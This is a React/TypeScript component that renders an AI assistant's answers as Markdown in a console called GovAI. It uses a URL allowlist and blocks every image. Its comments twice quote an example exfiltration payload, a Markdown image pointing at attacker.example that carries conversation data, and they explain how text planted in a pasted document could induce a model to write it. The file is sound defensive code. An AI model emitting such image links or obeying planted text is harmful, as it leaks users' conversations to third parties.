// Rendering an assistant answer as Markdown.
//
// ★ MODEL OUTPUT IS UNTRUSTED INPUT. It is not authored by the reader, it is not authored by
// GovAI, and it can contain anything a prompt can induce a model to write — including text a
// third party planted in a document the reader pasted. It reaches the DOM through exactly one
// path, and that path cannot execute anything:
//
//   • `react-markdown` builds a React element tree. There is no `dangerouslySetInnerHTML`
//     anywhere in this file, and none anywhere in the console.
//   • `rehype-raw` is NOT installed and NOT used. Raw HTML in the answer is therefore not
//     parsed as HTML at all — `<script>alert(1)</script>` renders as those characters.
//   • `urlTransform` is an explicit ALLOWLIST (http, https, mailto, and same-document
//     fragments). A `javascript:` or `data:` href never becomes an attribute value, so it
//     cannot become a clickable payload.
//   • every external link carries `rel="noopener noreferrer"`, so a linked page cannot reach
//     back through `window.opener`.
//   • ★ NO IMAGE IS EVER LOADED. An `href` is inert until someone clicks it; a `src` is fetched
//     the moment it renders. `![](https://attacker.example/?d=…)` would therefore exfiltrate
//     conversation content with no click and no warning — the classic Markdown-image channel,
//     reachable through a model's own confusion or through text planted in a document the
//     reader pasted. `src` is refused for every scheme AND `img` renders inert text, so the
//     allowlist and the component would each have to fail for anything to load.
//
// GFM is enabled because tables and fenced code are how technical answers are actually
// written, and rendering them as raw pipes and backticks would make the console worse at the
// one thing it exists for. A syntax highlighter is deliberately NOT added: it is the largest
// dependency in this class, the console is not an editor, and readable monospace with correct
// overflow is what a reader of a chat answer needs.

import { useCallback, useState, type ReactNode } from 'react';
import Markdown from 'react-markdown';
import remarkGfm from 'remark-gfm';
import { useI18n } from '../../../lib/i18n/I18nProvider.js';

/** Schemes a link may use. Everything else is dropped, attribute and all. */
const ALLOWED_SCHEMES = new Set(['http:', 'https:', 'mailto:']);

/**
 * The URL allowlist. Returns the URL when it is safe to render as an attribute, and `null` to
 * drop it. Exported so the policy is unit-testable without rendering a component.
 *
 * ★ `attribute` MATTERS, AND CONFLATING href WITH src IS AN EXFILTRATION BUG. An `href` is
 * inert until a person clicks it. A `src` is fetched by the browser the moment it renders, with
 * no click and no warning — so a model told to write
 * `![](https://attacker.example/?d=<conversation>)`, whether by its own confusion or by text
 * planted in a document the reader pasted, would send the conversation to a third party just by
 * being displayed. The same https: URL is therefore SAFE as a link and NEVER safe as a source.
 */
export function safeUrl(url: string, attribute: string = 'href'): string | null {
  // Nothing auto-loads. See the note above: `src` is the attribute that fetches without a
  // click, and this console renders no images at all (images are a declared non-goal).
  if (attribute === 'src') return null;
  const value = url.trim();
  if (value.length === 0) return null;
  // A same-document fragment or a relative path has no scheme and cannot execute.
  if (value.startsWith('#') || value.startsWith('/')) return value;
  let parsed: URL;
  try {
    // A base is required for relative inputs; anything that parses relative to it and keeps
    // the base's scheme is a relative URL, which is safe.
    parsed = new URL(value, 'https://govai.invalid/');
  } catch {
    return null;
  }
  return ALLOWED_SCHEMES.has(parsed.protocol) ? value : null;
}

/** Flatten a hast node to its text content — used so "copy" yields the code EXACTLY as the
 *  model wrote it, rather than whatever the rendered DOM happens to contain. */
function hastText(node: unknown): string {
  if (typeof node !== 'object' || node === null) return '';
  const n = node as { type?: string; value?: unknown; children?: unknown };
  if (n.type === 'text') return typeof n.value === 'string' ? n.value : '';
  if (!Array.isArray(n.children)) return '';
  return n.children.map(hastText).join('');
}

function CodeBlock({ code, children }: { code: string; children: ReactNode }) {
  const { t } = useI18n();
  const [copied, setCopied] = useState(false);

  const onCopy = useCallback(() => {
    const clipboard = typeof navigator === 'undefined' ? undefined : navigator.clipboard;
    if (!clipboard) return;
    void clipboard
      .writeText(code)
      .then(() => {
        setCopied(true);
        window.setTimeout(() => setCopied(false), 2000);
      })
      .catch(() => {
        // A denied clipboard permission is the browser's answer, not an application error.
        // The code is on screen and selectable either way.
      });
  }, [code]);

  return (
    <div className="group relative my-[var(--govai-space-3)]" data-testid="code-block">
      <button
        type="button"
        onClick={onCopy}
        className="absolute right-[var(--govai-space-2)] top-[var(--govai-space-2)] rounded-[var(--govai-radius-control)] border border-[var(--govai-border-strong)] bg-[var(--govai-bg-surface)] px-[var(--govai-space-2)] py-[2px] text-[length:var(--govai-text-2xs)] text-[var(--govai-text-secondary)] hover:bg-[var(--govai-bg-inset)]"
        data-testid="code-copy"
      >
        {copied ? t('ai.code.copied') : t('ai.code.copy')}
      </button>
      <pre className="govai-mono overflow-x-auto rounded-[var(--govai-radius-control)] border border-[var(--govai-border)] bg-[var(--govai-bg-inset)] p-[var(--govai-space-3)] pr-[var(--govai-space-8)] text-[length:var(--govai-text-xs)] leading-relaxed">
        {children}
      </pre>
    </div>
  );
}

export function AssistantMarkdown({ text }: { text: string }) {
  const { t } = useI18n();
  return (
    <div
      className="govai-answer max-w-none text-[length:var(--govai-text-base)] leading-relaxed text-[var(--govai-text-primary)]"
      data-testid="assistant-markdown"
    >
      <Markdown
        remarkPlugins={[remarkGfm]}
        urlTransform={(url, key) => safeUrl(url, key)}
        components={{
          // ★ NO <img> IS EVER EMITTED. Images are a declared non-goal of this delivery, and an
          // image is the one Markdown construct the browser fetches without a click — the
          // exfiltration channel described on `safeUrl`. The alt text is shown instead, marked
          // as an image that was not loaded, so the reader knows the model referred to one
          // rather than silently seeing nothing. Belt and braces with the `src` rule above:
          // this component would render inert text even if the allowlist were loosened.
          img: ({ alt, src }) => (
            <span
              className="govai-mono rounded-[3px] border border-[var(--govai-border)] bg-[var(--govai-bg-inset)] px-[4px] py-[1px] text-[length:var(--govai-text-2xs)] text-[var(--govai-text-secondary)]"
              data-testid="assistant-image-blocked"
              data-blocked-src={typeof src === 'string' && src.length > 0 ? 'yes' : undefined}
              title={t('ai.markdown.imageBlocked')}
            >
              {t('ai.markdown.imageBlocked')}
              {typeof alt === 'string' && alt.length > 0 ? `: ${alt}` : ''}
            </span>
          ),
          a: ({ children, href, ...props }) => (
            <a
              {...props}
              {...(href === undefined ? {} : { href })}
              target="_blank"
              rel="noopener noreferrer"
              className="text-[var(--govai-link)] underline underline-offset-2"
            >
              {children}
            </a>
          ),
          pre: ({ children, node }) => <CodeBlock code={hastText(node)}>{children}</CodeBlock>,
          code: ({ children, className }) => (
            <code
              className={
                className === undefined
                  ? 'govai-mono rounded-[3px] border border-[var(--govai-border)] bg-[var(--govai-bg-inset)] px-[3px] py-[1px]'
                  : className
              }
            >
              {children}
            </code>
          ),
          // Tables can be arbitrarily wide; the container scrolls rather than the page.
          table: ({ children }) => (
            <div className="my-[var(--govai-space-3)] overflow-x-auto">
              <table className="w-full border-collapse text-[length:var(--govai-text-sm)]">
                {children}
              </table>
            </div>
          ),
          th: ({ children }) => (
            <th className="border border-[var(--govai-border)] bg-[var(--govai-bg-inset)] px-[var(--govai-space-2)] py-[var(--govai-space-1)] text-left font-semibold">
              {children}
            </th>
          ),
          td: ({ children }) => (
            <td className="border border-[var(--govai-border)] px-[var(--govai-space-2)] py-[var(--govai-space-1)] align-top">
              {children}
            </td>
          ),
          blockquote: ({ children }) => (
            <blockquote className="my-[var(--govai-space-3)] border-l-2 border-[var(--govai-border-strong)] pl-[var(--govai-space-3)] text-[var(--govai-text-secondary)]">
              {children}
            </blockquote>
          ),
        }}
      >
        {text}
      </Markdown>
    </div>
  );
}
